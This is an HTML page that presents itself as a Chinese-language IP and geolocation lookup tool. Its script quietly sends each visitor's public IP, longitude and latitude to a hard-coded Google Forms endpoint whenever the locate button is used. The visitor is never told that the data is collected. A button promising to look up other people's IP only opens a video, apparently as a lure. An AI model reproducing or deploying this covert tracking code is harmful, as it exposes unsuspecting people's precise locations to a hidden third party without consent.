<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <title>IP与定位查询工具（完整版）</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; }
    #status { margin-top: 20px; white-space: pre-wrap; border: 1px solid #ccc; padding: 10px; min-height: 120px; }
    button { margin-top: 10px; padding: 10px 15px; font-size: 16px; cursor: pointer; }
  </style>
</head>
<body>
  <h1>IP与定位查询工具（完整版）</h1>
  <p>请点击下方按钮操作，页面加载时不会请求定位权限。</p>

  <button id="showIpBtn">显示当前公网 IP</button>
  <button id="locateBtn">点击获取定位并查询国家</button>
  <button id="bilibiliBtn">点此查询他人IP</button>

  <pre id="status">状态信息将显示在这里...</pre>

  <script>
    const googleFormURL = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSeWEBe4zv0G74aEItUIJIUhx-vcqLy4cVs_VO68Dqo0wN9H5w/formResponse";

    const entryIP = "entry.349181765";
    const entryLon = "entry.1434358418";
    const entryLat = "entry.99996352";

    // 获取公网IP
    async function getIP() {
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
      } catch {
        return "获取失败";
      }
    }

    // 通过ip_country_ranges.json判断IP归属国家
    async function fetchCountryFromIP(ip) {
      const ipNum = ip.split('.').reduce((acc, val) => acc * 256 + Number(val), 0);
      try {
        const response = await fetch('ip_country_ranges.json');
        const data = await response.json();

        for (const [start, end, country] of data) {
          if (ipNum >= start && ipNum <= end) {
            return country;
          }
        }
        return '未知国家';
      } catch {
        return '无法获取国家数据';
      }
    }

    // 提交数据到Google表单
    function postToGoogleForm(ip, lon, lat) {
      const formData = new FormData();
      formData.append(entryIP, ip);
      formData.append(entryLon, lon);
      formData.append(entryLat, lat);

      fetch(googleFormURL, {
        method: 'POST',
        mode: 'no-cors',
        body: formData
      }).catch(console.error);
    }

    // 显示当前公网IP按钮事件
    document.getElementById('showIpBtn').addEventListener('click', async () => {
      const status = document.getElementById('status');
      status.textContent = "查询中……";
      const ip = await getIP();
      status.textContent = `当前公网 IP 是：${ip}`;
    });

    // 定位并查询国家按钮事件
    document.getElementById('locateBtn').addEventListener('click', async () => {
      const status = document.getElementById('status');
      status.textContent = "查询IP中……";
      const ip = await getIP();

      const country = await fetchCountryFromIP(ip);
      status.textContent = `IP: ${ip}\n归属国家: ${country}\n等待定位中……`;

      if (!navigator.geolocation) {
        status.textContent += "\n浏览器不支持定位功能";
        postToGoogleForm(ip, "不支持", "不支持");
        return;
      }

      navigator.geolocation.getCurrentPosition(position => {
        const lat = position.coords.latitude.toFixed(6);
        const lon = position.coords.longitude.toFixed(6);
        status.textContent += `\n经度: ${lon}\n纬度: ${lat}`;
        postToGoogleForm(ip, lon, lat);
      }, err => {
        status.textContent += `\n定位失败：${err.message}`;
        postToGoogleForm(ip, "失败", "失败");
      }, {timeout: 15000});
    });

    // 打开哔哩哔哩视频按钮事件
    document.getElementById('bilibiliBtn').addEventListener('click', () => {
      window.open("https://www.bilibili.com/video/BV1GJ411x7h7/?spm_id_from=333.337.search-card.all.click&vd_source=7504f18c191405de66c8b613d77dfea9", "_blank");
    });
  </script>
</body>
</html>
